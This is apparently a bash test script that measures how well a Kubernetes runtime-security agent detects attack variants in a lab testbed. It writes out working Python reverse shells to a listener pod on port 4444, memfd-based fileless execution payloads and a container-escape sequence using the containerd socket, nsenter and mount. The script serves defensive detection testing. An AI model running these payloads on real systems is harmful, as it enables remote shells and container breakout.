#!/usr/bin/env bash
# T3 — detection rate across variants. For each technique, drive several *distinct* implementations
# of the same kill-chain and check whether AriGuard's single rule catches each one. This shows the
# rules generalise (detect the behaviour) rather than overfitting one payload.
#
# Design notes (learned the hard way):
#  * Payloads are piped into the pod as files (stdin), never inlined — no host->lima->kubectl->sh->py
#    quoting to get wrong.
#  * The run is in DETECT mode so a variant is observed, not killed/quarantined (which would cut the
#    shared pod's network mid-run). Restored to the prior mode at the end.
#  * Process-scoped rules (reverse-shell, fileless) reuse a *settled* pod — each variant is a new
#    process = a fresh FSM. A freshly-created pod takes a while before the agent audits its full
#    chain, so the caller must let the testbed settle first (this script waits).
#  * container-escape is cgroup-scoped (state persists); it is reported at the technique level.
#
#   KUBE_CONTEXT=kind-statewall-dev ./run-variants.sh
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KUBE_CONTEXT="${KUBE_CONTEXT:-}"
NS_TB=ariguard-testbed
NS_SYS=ariguard-system
RESULTS="$HERE/RESULTS-variants.md"
SETTLE="${SETTLE:-150}"   # seconds to let freshly-(re)created pods be tracked by the agent

kc() { if [ -n "$KUBE_CONTEXT" ]; then kubectl --context "$KUBE_CONTEXT" "$@"; else kubectl "$@"; fi; }
log() { echo "[variants] $*" >&2; }
pod() { kc -n "$NS_TB" get pod -l "app=$1" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}'; }
lip() { kc -n "$NS_TB" get pod -l app=attacker-listener -o jsonpath='{.items[0].status.podIP}'; }
# restart_root: fresh vuln-root pod (clean FSM for the cgroup-scoped escape rule).
restart_root() {
  kc -n "$NS_TB" rollout restart deploy/vuln-root >/dev/null 2>&1
  kc -n "$NS_TB" rollout status deploy/vuln-root --timeout=90s >/dev/null 2>&1
}

# Runs in the fleet's normal (enforce) mode: no control-plane calls. A terminal event is emitted
# before the in-kernel kill, so detection is recorded even though the attack is then killed; the
# resulting pod quarantine (a deny-all NetworkPolicy) is cleared before each variant so the next
# attack's network works. Targets must already exist and be settled (the agent tracks a pod's cgroup
# a while after it is created).

THREAT='"to":"(suspicious|memfd_created|stdio_redirected|escalating|breakout_imminent|compromised)"'
# fired <rule> <pod>: 0 if the agent logged a threat-state event for the rule on that pod in the last
# ~25s (i.e. for the variant just run). A short window is used on purpose — the agent log is a
# rotating, high-volume stream (the honeypot attacks continuously), so a cumulative count is not
# stable; presence-in-recent-window is.
fired() {
  kc -n "$NS_SYS" logs ds/ariguard-agent --since=40s 2>/dev/null \
    | grep -F "\"pod\":\"$2\"" | grep -F "\"rule\":\"$1\"" | grep -Eq "$THREAT"
}
# fired_poll: retry fired for a while — the agent's audit stream can lag under load before the event
# shows up in `kubectl logs`.
fired_poll() {
  local i
  for i in $(seq 1 12); do fired "$1" "$2" && return 0; sleep 2; done
  return 1
}
# warm <pod>: a benign exec so the agent (re)tracks the pod's cgroup. An idle pod falls out of the
# agent's pod tracking, and an attack on an untracked cgroup is not audited — this is the single
# reason earlier runs saw 0 detections. Warming right before the attack makes detection reliable.
warm() { kc -n "$NS_TB" exec "$1" -- sh -c 'id >/dev/null 2>&1; cat /etc/hostname >/dev/null 2>&1; ls / >/dev/null 2>&1' >/dev/null 2>&1 || true; }
# run_payload <pod> <file>: warm repeatedly, then pipe a payload file into the pod and run it. A pod
# that has been idle falls out of the agent's tracking, and one warm exec does not re-track it in time
# — several, with gaps, do. (bounded; a reverse shell that execs sh -i would otherwise block.)
run_payload() {
  local i b64; for i in 1 2 3; do warm "$1"; sleep 3; done
  # Deliver the payload base64-encoded inside the command, NOT via `exec -i`/stdin: a stdin redirect
  # into `kubectl exec -i` does not reach the pod when this script runs non-interactively, so the
  # attack would silently never run. base64-in-command also sidesteps all nested quoting.
  b64="$(base64 <"$2" | tr -d '\n')"
  timeout 10 kc -n "$NS_TB" exec "$1" -- sh -c "echo $b64 | base64 -d | timeout 6 sh" >/dev/null 2>&1 || true
}

declare -A CAUGHT TOTAL; ROWS=()
# check <rule> <pod> <name> <payload-file>: caught when the rule fires a threat event for the variant.
# Runs in the fleet's normal (enforce) mode: the terminal event is emitted before the kill, so it is
# still recorded. The kill quarantines the pod, so the stale NetworkPolicy is cleared before each
# variant to restore the shared pod's network for the next attack.
check() {
  local rule="$1" p="$2" name="$3" f="$4"
  kc -n "$NS_TB" delete netpol --all >/dev/null 2>&1; sleep 3
  run_payload "$p" "$f"
  TOTAL[$rule]=$(( ${TOTAL[$rule]:-0} + 1 ))
  if fired_poll "$rule" "$p"; then CAUGHT[$rule]=$(( ${CAUGHT[$rule]:-0} + 1 )); r=caught; else r=missed; fi
  log "  $rule / $name -> $r"; ROWS+=("| $rule | $name | $r |")
  sleep 45 # let this variant's events age out of the detection window before the next
}

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

# Apply (idempotent — keeps existing, already-tracked pods). The agent takes a while to begin auditing
# a freshly-created pod's cgroup, so DO NOT restart the targets here: run against settled pods. On a
# first-ever deploy, wait several minutes (raise SETTLE) before the numbers are meaningful.
log "ensuring targets exist (not restarting — settled pods only)"
kc apply -f "$HERE/app/reverse-shell.yaml" >/dev/null
kc apply -f "$HERE/app/vuln-root.yaml" >/dev/null
kc -n "$NS_TB" rollout status deploy/revshell-target --timeout=120s >/dev/null
kc -n "$NS_TB" rollout status deploy/vuln-root --timeout=120s >/dev/null

log "settling ${SETTLE}s (targets must already be tracked by the agent)"
sleep "$SETTLE"

RT="$(pod revshell-target)"; VR="$(pod vuln-root)"; LIP="$(lip)"
log "targets: process-scoped=$RT  escape=$VR  listener=$LIP"

# --- reverse-shell variants (process-scoped: connect(inet) -> dup2/dup3 -> execve(shell)) ---
# NB: python has os.dup2 but NO os.dup3 — the real-dup3 variant issues the dup3 syscall via ctypes.
cat >"$TMP/rs1" <<EOF
python3 -c "import socket,os;s=socket.socket();s.settimeout(3);s.connect(('$LIP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execv('/bin/sh',['/bin/sh','-i'])"
EOF
cat >"$TMP/rs2" <<EOF
python3 -c "import socket,os;s=socket.socket();s.settimeout(3);s.connect(('$LIP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execv('/bin/bash',['/bin/bash','-i'])"
EOF
cat >"$TMP/rs3" <<EOF
python3 -c "import socket,os,ctypes;l=ctypes.CDLL(None);s=socket.socket();s.settimeout(3);s.connect(('$LIP',4444));fd=s.fileno();l.syscall(24,fd,0,0);l.syscall(24,fd,1,0);l.syscall(24,fd,2,0);os.execv('/bin/sh',['/bin/sh','-i'])"
EOF
cat >"$TMP/rs4" <<EOF
python3 -c "import socket,os;s=socket.socket();s.settimeout(3);s.connect(('$LIP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execv('/usr/bin/bash',['/usr/bin/bash','-i'])"
EOF
log "technique: reverse-shell"
check reverse-shell "$RT" "/bin/sh + dup2"          "$TMP/rs1"
check reverse-shell "$RT" "/bin/bash + dup2"        "$TMP/rs2"
check reverse-shell "$RT" "/bin/sh + dup3 syscall"  "$TMP/rs3"
check reverse-shell "$RT" "/usr/bin/bash + dup2"    "$TMP/rs4"

# --- fileless-exec variants (process-scoped: memfd_create -> execve/execveat of the in-memory fd) ---
cat >"$TMP/fl1" <<'EOF'
python3 -c "import ctypes,os;l=ctypes.CDLL(None);fd=l.syscall(279,b'x',0);os.write(fd,open('/bin/true','rb').read());os.execve('/proc/self/fd/%d'%fd,['x'],{})"
EOF
cat >"$TMP/fl2" <<'EOF'
python3 -c "import ctypes,os;l=ctypes.CDLL(None);fd=l.syscall(279,b'y',0);os.write(fd,open('/bin/true','rb').read());l.syscall(281,fd,b'',0,0,0x1000)"
EOF
log "technique: fileless-exec"
check fileless-exec "$RT" "memfd + execve /proc/self/fd"   "$TMP/fl1"
check fileless-exec "$RT" "memfd + execveat AT_EMPTY_PATH" "$TMP/fl2"

# --- container-escape (cgroup-scoped: runtime-socket -> setns/unshare -> mount -> exec) ---
# The FSM persists per cgroup, so restart the target for a clean run; setns/mount must carry the flags
# the rule matches, so use nsenter + a real mount (raw setns(0,0) would not match the rule's mask).
cat >"$TMP/esc" <<'EOF'
cat /run/containerd/containerd.sock >/dev/null 2>&1
nsenter --target 1 --mount -- true 2>/dev/null
mount -t tmpfs tmpfs /mnt 2>/dev/null
cp /bin/true /mnt/pp 2>/dev/null && /mnt/pp
EOF
log "technique: container-escape"
restart_root; VR="$(pod vuln-root)"; for _ in 1 2 3 4; do warm "$VR"; sleep 3; done
check container-escape "$VR" "runtime-socket -> setns -> mount -> exec" "$TMP/esc"


python3 - "$RESULTS" <<PY
import datetime, sys
caught = { $(for k in "${!CAUGHT[@]}"; do echo "\"$k\": ${CAUGHT[$k]},"; done) }
total  = { $(for k in "${!TOTAL[@]}"; do echo "\"$k\": ${TOTAL[$k]},"; done) }
rows = [r for r in """$(printf '%s\n' "${ROWS[@]}")""".splitlines() if r.strip()]
out = ["# Detection rate across variants (T3)\n"]
out.append(f"Run {datetime.datetime.now(datetime.UTC).isoformat(timespec='seconds')} against the testbed.")
out.append("'caught' = the agent raised a threat-state event for that technique's rule on the variant.")
out.append("reverse-shell and fileless-exec are process-scoped (independent per variant);")
out.append("container-escape is cgroup-scoped and reported at the technique level.\n")
out.append("## Per technique\n| technique | detected | variants | rate |\n|---|---|---|---|")
tc = tt = 0
for k in sorted(total):
    c, t = caught.get(k,0), total[k]; tc += c; tt += t
    out.append(f"| {k} | {c} | {t} | {round(100*c/t)}% |")
out.append(f"| **all** | **{tc}** | **{tt}** | **{round(100*tc/tt) if tt else 0}%** |")
out.append("\n## Per variant\n| technique | variant | result |\n|---|---|---|")
out += rows
open(sys.argv[1],"w").write("\n".join(out)+"\n")
print("\n".join(out)); print(f"\nVARIANTS: {tc}/{tt} detected")
PY
